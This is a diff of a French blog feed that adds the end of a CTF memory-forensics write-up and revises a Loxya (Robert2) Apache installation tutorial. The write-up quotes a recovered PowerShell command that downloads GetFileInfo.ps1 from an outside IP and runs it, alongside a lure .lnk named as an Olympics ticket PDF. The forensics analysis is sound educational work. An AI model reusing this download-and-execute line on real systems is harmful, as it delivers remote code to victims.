+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="n">Authorff</span><span class="s2">&#34;Invoke-WebRequest-Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1
+</span></span></span></code></pre></div><p>Le nom du script est <strong>GetFilesInfo.ps1</strong>.</p>
+<hr>
+<h2 id="flag">Flag</h2>
+<p>En regroupant les 3 informations, le flag est: <strong>SHLK{Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf.lnk-IGotYourFileInfo-GetFilesInfo.ps1}</strong>.</p>
+<hr>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet">https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet</a></li>
+<li><a href="https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html">https://volatility3.readthedocs.io/en/stable/volatility3.plugins.banners.html</a></li>
+<li><a href="https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder">https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder</a></li>
+<li><a href="https://fr.wikipedia.org/wiki/.lnk">https://fr.wikipedia.org/wiki/.lnk</a></li>
+</ul>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Installation de Loxya(Robert2)</title>
@@ -80,7 +601,13 @@
 <h3 id="serveur-web">Serveur Web</h3>
 <p>Robert2 nécessite un serveur Web pour fonctionner, il ne supporte que <strong>NGINX</strong> et <strong>Apache2</strong>, je vais ici utiliser ce dernier.</p>
 <h4 id="http">HTTP</h4>
-<p><strong>/!\ Attention /!\ il est fortemment déconseillé de déployer le serveur en HTTP en production.</strong></p>
+
+    <aside class="admonition warning">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><b>Avertissement</b>
+        </div>
+        <div class="admonition-content">Il est fortemment déconseillé de déployer le serveur en HTTP en production</div>
+    </aside>
 <p>Créer et modifier le fichier <code>/etc/apache2/sites-available/robert2.mydomain.local.conf</code>:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">&lt;VirtualHost *:80&gt;
 </span></span><span class="line"><span class="cl">        ServerAdmin admin@mydomain.local
@@ -138,7 +665,7 @@
 </span></span><span class="line"><span class="cl">&lt;/VirtualHost&gt;
 </span></span></code></pre></div><h4 id="paramétrage-dapache2">Paramétrage d&rsquo;Apache2</h4>
 <p>Afin de paramétrer correctement Apache2, il faut éditer le fichier <code>/etc/apache2/apache2.conf</code> et rajouter la ligne <code>ServerName 127.0.0.1</code> à la fin.</p>
-<p>Sans ça, l&rsquo;erreur <strong>Apache Configuration Error AH00558: Could not reliably determine the server&rsquo;s fully qualified domain name</strong> va apparaître quadn on va utiliser <strong>apache2ctl configtest</strong>.</p>
+<p>Sans ça, l&rsquo;erreur <strong>Apache Configuration Error AH00558: Could not reliably determine the server&rsquo;s fully qualified domain name</strong> va apparaître quand on va utiliser <strong>apache2ctl configtest</strong>.</p>
 <p>On active ensuite le VHost du serveur, désactive le site par défaut et vérifie la configuration:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo a2ensite robert2.mydomain.local
 </span></span><span class="line"><span class="cl">sudo a2dissite 000-default.conf
@@ -168,7 +695,16 @@
 <div>
         <img src="/posts/installation_robert2/images/Capture2.png" alt="Capture2">
 </div>
-<p>Cette page demande l&rsquo;<strong>URL d&rsquo;application</strong> qui est l&rsquo;URL à laquelle on va se connecter à Robert2, elle est très importante car si on ne rentre pas EXACTEMENT cette dernière (protocole inclut) dans notre navigateur, il sera impossible de s&rsquo;identifier ou le serveur sera inaccessible.</p>
+<p>Cette page demande l&rsquo;<strong>URL d&rsquo;application</strong> qui est l&rsquo;URL à laquelle on va se connecter à Robert2 (ici <code>https://robert2.mydomain.local</code>, il manque une partie sur la capture d&rsquo;écran).</p>
+
+    <aside class="admonition warning">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><b>Avertissement</b>
+        </div>
+        <div class="admonition-content"><p>Cette valeur est très importante car si on ne rentre pas EXACTEMENT cette dernière (protocole inclut) dans notre navigateur, il sera impossible de s&rsquo;identifier ou le serveur sera inaccessible.</p>
+<p>En cas de problème, voir <a href="#d%C3%A9sol%C3%A9-mais-lapi-est-inaccessible">ici</a>.</p>
+</div>
+    </aside>
 <p>Après ça, il y a deux pages nous demandant de valider des paramètres et renseigner les informations de notre société avant d&rsquo;arriver au paramétrage de la BDD.</p>
 <div>
         <img src="/posts/installation_robert2/images/Capture5.png" alt="Capture5">
@@ -180,7 +716,7 @@
 <li><strong>Mot de passe MYSQL (password):</strong> Le mot de passe de l&rsquo;utilisateur</li>
 <li><strong>Nom de la base de données:</strong> Ici robert2_db</li>
 </ul>
-<p>Une fois cela fait, il n&rsquo;y a plus qu&rsquo;a laisser Robert2 créer la structure de la BDD, créer un utilisateur et le tour est joué !</p>
+<p>Une fois cela fait, il n&rsquo;y a plus qu&rsquo;a laisser Robert2 créer la structure de la BDD, créer un utilisateur et le serveur est prêt !</p>
 <hr>
 <h2 id="erreurs">Erreurs</h2>
 <h3 id="page-blanche">Page blanche</h3>
@@ -188,8 +724,8 @@
 <h3 id="apachectl-status-renvoie-un-problème-avec-www-browser">apachectl status renvoie un problème avec www-browser</h3>
 <p>Installer le paquet <strong>w3m</strong>.</p>
 <h3 id="désolé-mais-lapi-est-inaccessible">Désolé, mais l&rsquo;API est inaccessible&hellip;</h3>
-<p>Cela signifie que l&rsquo;URL a laquelle vous vous connectez n&rsquo;est pas la même que celle inscrite après <strong>baseUrl</strong> dans le fichier <code>/var/www/Robert2/src/App/Config/settings.json</code>.
-Cela peut être au niveau du protocole (HTTPS/HTTP) ou parce que vous vous y connecter depuis l&rsquo;adresse IP alors que le nom de domaine y est paramétré.</p>
+<p>Cela signifie que l&rsquo;URL a laquelle vous vous connectez n&rsquo;est pas la même que celle inscrite après <strong>baseUrl</strong> dans le fichier <code>/var/www/Robert2/src/App/Config/settings.json</code>.</p>
+<p>Cela peut être au niveau du protocole (HTTPS/HTTP) ou parce que vous vous y connecter depuis l&rsquo;adresse IP alors que le nom de domaine y est paramétré.</p>
 <hr>
 <h2 id="sources">Sources</h2>
 <ul>
